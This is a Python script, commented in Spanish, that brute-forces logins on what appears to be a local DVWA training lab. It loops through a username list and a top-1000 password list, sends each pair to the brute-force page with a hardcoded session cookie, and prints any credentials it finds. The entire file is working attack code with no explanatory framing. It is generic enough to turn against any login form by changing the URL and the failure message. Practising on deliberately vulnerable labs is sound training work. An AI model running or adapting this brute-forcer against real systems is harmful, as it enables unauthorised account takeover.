import requests
import time

# config
url = "http://localhost:4280/vulnerabilities/brute/"
cookies = {
    'PHPSESSID': 'a96158b51f598d41d91fa0d2c5e60656', 
    'security': 'low'
}

# rutas de data
user_file = "data/usuarios.txt"
pass_file = "data/Pwdb_top-1000.txt"

def brute_force():
    try:
        with open(user_file, 'r') as u_file:
            users = [line.strip() for line in u_file]
        with open(pass_file, 'r') as p_file:
            passwords = [line.strip() for line in p_file]
    except FileNotFoundError as e:
        print(f"Error: No se encontró el archivo {e.filename}")
        return

    print(f"[+] Iniciando ataque... Probando {len(users) * len(passwords)} combinaciones.")
    start_time = time.time()
    found = []

    for user in users:
        for password in passwords:
            params = {
                'username': user,
                'password': password,
                'Login': 'Login'
            }
            
            response = requests.get(url, params=params, cookies=cookies)
            
            if "Username and/or password incorrect" not in response.text:
                print(f"[!] ¡ÉXITO! Usuario: {user} | Password: {password}")
                found.append((user, password))
    
    end_time = time.time()
    print(f"\n--- Resumen ---")
    print(f"Tiempo total: {end_time - start_time:.2f} segundos")
    print(f"Credenciales encontradas: {len(found)}")
    for u, p in found:
        print(f" >> {u}:{p}")

if __name__ == "__main__":
    brute_force()